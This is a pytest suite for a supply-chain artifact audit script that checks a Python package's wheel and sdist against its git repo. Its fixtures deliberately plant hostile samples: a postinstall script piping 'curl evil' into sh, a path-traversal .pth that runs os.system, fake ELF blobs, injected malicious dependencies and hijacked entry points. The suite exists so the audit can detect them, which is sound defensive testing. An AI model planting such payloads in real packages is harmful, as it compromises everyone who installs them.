"""Tests for scripts/audit_wheel.py, the supply-chain artifact gate."""

import importlib.util
import io
import subprocess
import tarfile
import zipfile
from pathlib import Path

import pytest

_SCRIPT = Path(__file__).resolve().parent.parent / 'scripts' / 'audit_wheel.py'
_spec = importlib.util.spec_from_file_location('audit_wheel', _SCRIPT)
assert _spec is not None and _spec.loader is not None
audit_wheel = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(audit_wheel)

VERSION = '1.0.0'
PKG_FILES = {
    'credactor/__init__.py': b"__version__ = '1.0.0'\n",
    'credactor/core.py': b'def run():\n    return 42\n',
}
EXPECTED_ENTRY_POINTS = b'[console_scripts]\ncredactor = credactor.cli:main\n'
PYPROJECT = (
    b'[project]\nname = "credactor"\ndynamic = ["version"]\n\n'
    b'[project.optional-dependencies]\n'
    b'encoding = ["charset-normalizer>=3.0"]\n'
    b'dev = ["pytest>=8.0", "coverage[toml]>=7.0"]\n'
)
# What setuptools writes for PYPROJECT, in its order.
DEPS = (
    b'Provides-Extra: encoding\n'
    b'Requires-Dist: charset-normalizer>=3.0; extra == "encoding"\n'
    b'Provides-Extra: dev\n'
    b'Requires-Dist: pytest>=8.0; extra == "dev"\n'
    b'Requires-Dist: coverage[toml]>=7.0; extra == "dev"\n'
)
METADATA = b'Metadata-Version: 2.4\nName: credactor\nVersion: 1.0.0\n' + DEPS
REQUIRES_TXT = b'\n[dev]\npytest>=8.0\ncoverage[toml]>=7.0\n\n[encoding]\ncharset-normalizer>=3.0\n'
SETUP_CFG = b'[egg_info]\ntag_build = \ntag_date = 0\n\n'


def _git(repo: Path, *args: str) -> None:
    subprocess.run(['git', *args], cwd=repo, check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path, monkeypatch):
    """A committed repo with a credactor/ package; cwd is set inside it."""
    (tmp_path / 'credactor').mkdir()
    for rel, data in PKG_FILES.items():
        (tmp_path / rel).write_bytes(data)
    (tmp_path / 'pyproject.toml').write_bytes(PYPROJECT)
    (tmp_path / 'README.md').write_bytes(b'# credactor\n')
    _git(tmp_path, 'init', '-q')
    _git(tmp_path, 'config', 'user.email', 'a@b.c')
    _git(tmp_path, 'config', 'user.name', 't')
    _git(tmp_path, 'add', '-A')
    _git(tmp_path, 'commit', '-qm', 'init')
    monkeypatch.chdir(tmp_path)
    (tmp_path / 'dist').mkdir()
    return tmp_path


def _wheel(
    repo: Path,
    files: dict[str, bytes],
    *,
    dist_info: bool = True,
    metadata: bytes | None = METADATA,
    entry_points: bytes | None = None,
    top_level: bytes | None = None,
    extra_members: list[tuple[str, bytes]] | None = None,
    version: str = VERSION,
) -> Path:
    path = repo / 'dist' / f'credactor-{version}-py3-none-any.whl'
    with zipfile.ZipFile(path, 'w') as z:
        for name, data in files.items():
            z.writestr(name, data)
        if dist_info:
            if metadata is not None:
                z.writestr(f'credactor-{version}.dist-info/METADATA', metadata)
            z.writestr(f'credactor-{version}.dist-info/RECORD', b'')
            if entry_points is not None:
                z.writestr(f'credactor-{version}.dist-info/entry_points.txt', entry_points)
            if top_level is not None:
                z.writestr(f'credactor-{version}.dist-info/top_level.txt', top_level)
        # Raw extra members (allows duplicate names and arbitrary paths the dict
        # form cannot express, e.g. a smuggled file under .dist-info/).
        for name, data in extra_members or []:
            z.writestr(name, data)
    return path


def _sdist(
    repo: Path,
    files: dict[str, bytes],
    *,
    metadata: bool = True,
    pyproject: bytes = PYPROJECT,
    pkg_info: bytes = METADATA,
    version: str = VERSION,
) -> Path:
    path = repo / 'dist' / f'credactor-{version}.tar.gz'
    prefix = f'credactor-{version}'
    with tarfile.open(path, 'w:gz') as t:

        def add(arc: str, data: bytes) -> None:
            info = tarfile.TarInfo(f'{prefix}/{arc}')
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))

        for name, data in files.items():
            add(name, data)
        if metadata:
            add('PKG-INFO', pkg_info)
            add('pyproject.toml', pyproject)
            add('README.md', b'# credactor\n')
    return path


def _audit_fails_with(capsys, category: str) -> None:
    """Run the audit, assert it exits non-zero AND reports the given category."""
    with pytest.raises(SystemExit):
        audit_wheel.audit('dist')
    assert category in capsys.readouterr().err


def test_passes_on_matching_artifacts(repo):
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES)
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_altered_wheel_content(repo, capsys):
    tampered = dict(PKG_FILES)
    tampered['credactor/core.py'] = b'def run():\n    return 666  # injected\n'
    _wheel(repo, tampered)
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'CONTENT MISMATCH')


def test_fails_on_injected_file_in_wheel(repo, capsys):
    extra = dict(PKG_FILES)
    extra['credactor/evil.py'] = b'print("pwned")\n'
    _wheel(repo, extra)
    _sdist(repo, PKG_FILES)
    # A .py under credactor/ is a package file, so the wheel flags it as not-in-repo.
    _audit_fails_with(capsys, 'NOT IN REPO')


def test_fails_on_missing_file_in_wheel(repo, capsys):
    _wheel(repo, {'credactor/__init__.py': PKG_FILES['credactor/__init__.py']})
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'MISSING FROM WHEEL')


def test_fails_on_unexpected_toplevel_in_wheel(repo, capsys):
    smuggled = dict(PKG_FILES)
    smuggled['evil.py'] = b'print("pwned")\n'
    _wheel(repo, smuggled)
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_altered_sdist_content(repo, capsys):
    _wheel(repo, PKG_FILES)
    tampered = dict(PKG_FILES)
    tampered['credactor/core.py'] = b'def run():\n    return 0  # injected\n'
    _sdist(repo, tampered)
    _audit_fails_with(capsys, 'CONTENT MISMATCH')


def test_fails_on_unexpected_py_in_sdist(repo, capsys):
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['hack.py'] = b'print("pwned")\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_sdist_member_escaping_the_root(repo, capsys):
    # Path traversal: a member named `credactor-X/../payload.pth` starts with the
    # archive prefix as a raw string but normalizes outside the sdist root. A
    # startswith()-only check accepted it; it must be rejected as an escape.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['../payload.pth'] = b'import os; os.system("id")\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'member escapes')


def test_fails_on_tampered_tracked_nonpackage_in_sdist(repo, capsys):
    # A tracked non-package file shipped in the sdist (here pyproject.toml) must
    # match HEAD byte-for-byte, not pass on its name alone: an sdist install builds
    # from its pyproject.toml, so a tampered build config (e.g. a malicious build
    # dependency) would otherwise build unreviewed.
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES, pyproject=b'[build-system]\nrequires = ["setuptools", "evil"]\n')
    _audit_fails_with(capsys, 'CONTENT MISMATCH')


def test_passes_on_matching_tracked_nonpackage_in_sdist(repo):
    # The byte-check must not over-reach: a tracked non-package file whose bytes
    # match HEAD still passes (the fixture commits this exact pyproject.toml).
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES)  # default pyproject/README match the committed bytes
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_untracked_so_under_credactor_in_sdist(repo, capsys):
    # AW-1: a smuggled compiled extension under credactor/ must not pass the gate.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor/payload.so'] = b'\x7fELF\x02\x01\x01\x00'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_untracked_nested_so_under_credactor_in_sdist(repo, capsys):
    # AW-1: the strict check must also catch members nested below credactor/.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor/sub/payload.so'] = b'\x7fELF\x02\x01\x01\x00'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_pyc_under_credactor_in_sdist(repo, capsys):
    # AW-1: bytecode under credactor/ is rejected just as the wheel rejects it.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor/evil.pyc'] = b'\x00\x00\x00\x00bytecode'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_py_under_egg_info_in_sdist(repo, capsys):
    # AW-2: a hand-authored .py nested under an *.egg-info/ path must be flagged, not
    # exempted by an unanchored substring match.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor.egg-info/evil.py'] = b'print("pwned")\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_py_under_nested_egg_info_in_sdist(repo, capsys):
    # AW-2: the substring hole was exploitable at any depth under any *.egg-info dir.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['x.egg-info/sub/evil.py'] = b'print("pwned")\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_passes_on_benign_egg_info_metadata(repo):
    # AW-2 must not over-reach: genuine egg-info bookkeeping text files still pass.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor.egg-info/SOURCES.txt'] = b'credactor/__init__.py\ncredactor/core.py\n'
    extra['credactor.egg-info/top_level.txt'] = b'credactor\n'
    extra['credactor.egg-info/dependency_links.txt'] = b'\n'
    _sdist(repo, extra)
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_missing_sdist(repo):
    _wheel(repo, PKG_FILES)
    with pytest.raises(SystemExit):
        audit_wheel.audit('dist')


def test_fails_on_empty_dist(repo):
    with pytest.raises(SystemExit):
        audit_wheel.audit('dist')


def test_fails_on_missing_dist_dir(repo):
    with pytest.raises(SystemExit):
        audit_wheel.audit('nonexistent')


# --- AW-3: wheel .dist-info content verification (gap G-W1/G-W2) ---


def test_fails_on_injected_dependency_in_wheel_metadata(repo, capsys):
    # G-W1a: an unconditional Requires-Dist in METADATA installs an attacker's
    # package on every `pip install`; it must be rejected (Credactor ships none).
    _wheel(repo, PKG_FILES, metadata=METADATA + b'Requires-Dist: evil-malware-pkg\n')
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'UNEXPECTED DEPENDENCY')


def test_passes_on_extra_gated_requires_dist_in_wheel(repo):
    # The dependency check must not over-reach: the extras-gated dependencies
    # setuptools emits for [project.optional-dependencies] pass.
    _wheel(repo, PKG_FILES, metadata=METADATA)
    _sdist(repo, PKG_FILES)
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_repointed_entry_points_in_wheel(repo, capsys):
    # G-W1b: repointing the console script turns `credactor` into attacker code.
    _wheel(repo, PKG_FILES, entry_points=b'[console_scripts]\ncredactor = evil.payload:pwn\n')
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'ENTRY POINTS ALTERED')


def test_passes_on_expected_entry_points_in_wheel(repo):
    # The entry-point check must not over-reach: the real console script passes.
    _wheel(repo, PKG_FILES, entry_points=EXPECTED_ENTRY_POINTS, top_level=b'credactor\n')
    _sdist(repo, PKG_FILES)
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_altered_top_level_in_wheel(repo, capsys):
    _wheel(repo, PKG_FILES, top_level=b'evilpkg\n')
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'TOP LEVEL ALTERED')


def test_fails_on_extra_file_under_wheel_distinfo(repo, capsys):
    # G-W1: a new file smuggled into the dist-info tree (previously name-allowlisted
    # and never inspected) must be rejected.
    _wheel(
        repo,
        PKG_FILES,
        extra_members=[(f'credactor-{VERSION}.dist-info/EVIL.py', b'print("pwned")\n')],
    )
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_unanchored_distinfo_substring_in_wheel(repo, capsys):
    # G-W2: a path merely containing `.dist-info/` mid-name (here under a .data
    # tree) must not be trusted as metadata; the classifier is anchored now.
    _wheel(
        repo,
        PKG_FILES,
        extra_members=[(f'credactor-{VERSION}.data/purelib/x.dist-info/evil.pth', b'bad\n')],
    )
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_untracked_licence_under_wheel_distinfo(repo, capsys):
    # A file under dist-info/licenses/ that maps to no tracked file is rejected.
    _wheel(
        repo,
        PKG_FILES,
        extra_members=[(f'credactor-{VERSION}.dist-info/licenses/evil.txt', b'x\n')],
    )
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_duplicate_member_in_wheel(repo, capsys):
    # G-W4: two members share a name; a set collapses them and z.read() returns
    # only one copy, so an evil/clean pair would pass undetected without this.
    _wheel(repo, PKG_FILES, extra_members=[('credactor/core.py', b'def run():\n    return 666\n')])
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'DUPLICATE MEMBER')


# --- AW-4: sdist fail-closed default-deny (gap G-S1/G-S2/G-S3, the xz class) ---


def test_fails_on_untracked_shell_script_in_sdist(repo, capsys):
    # G-S1: an untracked non-.py file (the xz `build-to-host.m4` / postinstall.sh
    # class) used to ride the implicit default-allow; it must now be rejected.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['postinstall.sh'] = b'#!/bin/sh\ncurl evil | sh\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_untracked_binary_fixture_in_sdist(repo, capsys):
    # G-S1: a binary fixture (xz shipped a malicious `.so`/test blob in the tarball).
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['tests/files/bad.so'] = b'\x7fELF\x02\x01\x01\x00'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED')


def test_fails_on_injected_dependency_in_sdist_pkginfo(repo, capsys):
    # G-S2/G-S3: an unconditional Requires-Dist injected into the sdist PKG-INFO.
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES, pkg_info=METADATA + b'Requires-Dist: evil-malware-pkg\n')
    _audit_fails_with(capsys, 'UNEXPECTED DEPENDENCY')


def test_fails_on_repointed_entry_points_in_sdist_egginfo(repo, capsys):
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor.egg-info/entry_points.txt'] = b'[console_scripts]\ncredactor = evil:pwn\n'
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'ENTRY POINTS ALTERED')


def test_fails_on_unconditional_requires_txt_in_sdist(repo, capsys):
    # An egg-info requires.txt requirement before the first [extra] section is an
    # unconditional install-time dependency, which Credactor does not have.
    _wheel(repo, PKG_FILES)
    extra = dict(PKG_FILES)
    extra['credactor.egg-info/requires.txt'] = b'evil-malware-pkg\n' + REQUIRES_TXT
    _sdist(repo, extra)
    _audit_fails_with(capsys, 'UNEXPECTED DEPENDENCY')


# --- exactly-one-artifact (gap G-W7/G-I9) ---


def test_fails_on_two_wheels(repo, capsys):
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES)
    src = repo / 'dist' / f'credactor-{VERSION}-py3-none-any.whl'
    (repo / 'dist' / f'credactor-{VERSION}-py3-none-linux_x86_64.whl').write_bytes(src.read_bytes())
    _audit_fails_with(capsys, 'exactly one .whl')


def test_fails_on_two_sdists(repo, capsys):
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES)
    src = repo / 'dist' / f'credactor-{VERSION}.tar.gz'
    (repo / 'dist' / 'credactor-1.0.1.tar.gz').write_bytes(src.read_bytes())
    _audit_fails_with(capsys, 'exactly one .tar.gz')


# --- SR-28: metadata parsed as headers and compared with pyproject exactly ---

_WHERE = ['wheel', 'sdist', 'egg-info']


def _build_with_metadata(repo: Path, where: str, metadata: bytes) -> None:
    """Build a wheel and an sdist whose metadata at *where* is *metadata*."""
    if where == 'wheel':
        _wheel(repo, PKG_FILES, metadata=metadata)
        _sdist(repo, PKG_FILES)
    elif where == 'sdist':
        _wheel(repo, PKG_FILES)
        _sdist(repo, PKG_FILES, pkg_info=metadata)
    else:
        _wheel(repo, PKG_FILES)
        files = dict(PKG_FILES)
        files['credactor.egg-info/PKG-INFO'] = metadata
        _sdist(repo, files)


_BAD_METADATA = {
    'lowercase-requires-dist': (METADATA + b'requires-dist: evil-malware-pkg\n', 'DEPENDENCY'),
    'lowercase-name': (METADATA.replace(b'Name: credactor', b'name: evil'), 'NAME'),
    'folded-requires-dist': (
        METADATA + b'Requires-Dist: evil-malware-pkg; extra == "dev"\n or python_version >= "3"\n',
        'DEPENDENCY',
    ),
    'duplicate-name-evil-first': (
        METADATA.replace(b'Name: credactor', b'Name: evil\nName: credactor'),
        'NAME',
    ),
    'missing-name': (METADATA.replace(b'Name: credactor\n', b''), 'NAME'),
    'extra-or-true': (
        METADATA + b'Requires-Dist: evil-malware-pkg; extra == "x" or true\n',
        'DEPENDENCY',
    ),
    'marker-or-extra': (
        METADATA
        + b'Requires-Dist: evil-malware-pkg; python_version >= "3.11" or extra == "never"\n',
        'DEPENDENCY',
    ),
    'undeclared-on-declared-extra': (
        METADATA + b'Requires-Dist: evil-malware-pkg; extra == "encoding"\n',
        'DEPENDENCY',
    ),
    'weaker-specifier': (METADATA.replace(b'>=3.0', b'>=0.1'), 'DEPENDENCY'),
    'missing-dependency': (
        METADATA.replace(b'Requires-Dist: pytest>=8.0; extra == "dev"\n', b''),
        'MISSING DEPENDENCY',
    ),
    'duplicate-dependency': (
        METADATA + b'Requires-Dist: pytest>=8.0; extra == "dev"\n',
        'DEPENDENCY',
    ),
    'version-mismatch': (METADATA.replace(b'Version: 1.0.0', b'Version: 6.6.6'), 'VERSION'),
    'missing-version': (METADATA.replace(b'Version: 1.0.0\n', b''), 'VERSION'),
    'duplicate-version': (METADATA + b'Version: 6.6.6\n', 'VERSION'),
    'undeclared-extra': (METADATA + b'Provides-Extra: evil\n', 'EXTRAS'),
    'missing-extra': (METADATA.replace(b'Provides-Extra: dev\n', b''), 'EXTRAS'),
}


@pytest.mark.parametrize('where', _WHERE)
@pytest.mark.parametrize('case', sorted(_BAD_METADATA))
def test_fails_on_tampered_metadata(repo, capsys, where, case):
    metadata, category = _BAD_METADATA[case]
    _build_with_metadata(repo, where, metadata)
    _audit_fails_with(capsys, category)


_GOOD_METADATA = {
    'as-built': METADATA,
    'lowercase-headers': METADATA.lower(),
    'reordered-and-respaced': (
        b'Metadata-Version: 2.4\nVersion: 1.0.0\nName: credactor\n'
        b'Provides-Extra: dev\nProvides-Extra: encoding\n'
        b'Requires-Dist: coverage[toml] >= 7.0 ; extra == "dev"\n'
        b'Requires-Dist: Pytest>=8.0; extra == "dev"\n'
        b"Requires-Dist: charset_normalizer>=3.0; extra == 'encoding'\n"
    ),
    # The description body follows the first blank line; it is not a header.
    'body-mentions-a-header': METADATA + b'\nRequires-Dist: evil-malware-pkg\nName: evil\n',
}


@pytest.mark.parametrize('where', _WHERE)
@pytest.mark.parametrize('case', sorted(_GOOD_METADATA))
def test_passes_on_equivalent_metadata(repo, where, case):
    _build_with_metadata(repo, where, _GOOD_METADATA[case])
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_wheel_filename_version_mismatch(repo, capsys):
    _wheel(repo, PKG_FILES, version='6.6.6')
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'VERSION')


def test_fails_on_sdist_directory_version_mismatch(repo, capsys):
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES, version='6.6.6')
    _audit_fails_with(capsys, 'VERSION')


def test_fails_on_wheel_without_metadata(repo, capsys):
    _wheel(repo, PKG_FILES, metadata=None)
    _sdist(repo, PKG_FILES)
    _audit_fails_with(capsys, 'MISSING METADATA')


def test_fails_on_sdist_without_pkg_info(repo, capsys):
    _wheel(repo, PKG_FILES)
    _sdist(repo, PKG_FILES, metadata=False)
    _audit_fails_with(capsys, 'MISSING METADATA')


def _build_with_egg_info(repo: Path, name: str, data: bytes) -> None:
    _wheel(repo, PKG_FILES)
    files = dict(PKG_FILES)
    files[f'credactor.egg-info/{name}'] = data
    _sdist(repo, files)


def test_passes_on_generated_requires_txt(repo):
    _build_with_egg_info(repo, 'requires.txt', REQUIRES_TXT)
    audit_wheel.audit('dist')  # no SystemExit means it passed


_BAD_REQUIRES_TXT = {
    'undeclared-in-declared-section': (REQUIRES_TXT + b'evil-malware-pkg\n', 'DEPENDENCY'),
    'weaker-specifier': (REQUIRES_TXT.replace(b'>=3.0', b'>=0.1'), 'DEPENDENCY'),
    'missing-dependency': (REQUIRES_TXT.replace(b'pytest>=8.0\n', b''), 'MISSING DEPENDENCY'),
    'marker-section': (
        REQUIRES_TXT + b'\n[:python_version >= "3"]\nevil-malware-pkg\n',
        'DEPENDENCY',
    ),
    'undeclared-section': (REQUIRES_TXT + b'\n[evil]\nevil-malware-pkg\n', 'DEPENDENCY'),
}


@pytest.mark.parametrize('case', sorted(_BAD_REQUIRES_TXT))
def test_fails_on_tampered_requires_txt(repo, capsys, case):
    data, category = _BAD_REQUIRES_TXT[case]
    _build_with_egg_info(repo, 'requires.txt', data)
    _audit_fails_with(capsys, category)


def _build_with_setup_cfg(repo: Path, data: bytes) -> None:
    _wheel(repo, PKG_FILES)
    files = dict(PKG_FILES)
    files['setup.cfg'] = data
    _sdist(repo, files)


def test_passes_on_generated_setup_cfg(repo):
    _build_with_setup_cfg(repo, SETUP_CFG)
    audit_wheel.audit('dist')  # no SystemExit means it passed


def test_fails_on_setup_cfg_with_install_requires(repo, capsys):
    # setuptools honours [options] install_requires from an sdist's setup.cfg.
    _build_with_setup_cfg(repo, SETUP_CFG + b'[options]\ninstall_requires = evil-malware-pkg\n')
    _audit_fails_with(capsys, 'SETUP.CFG')
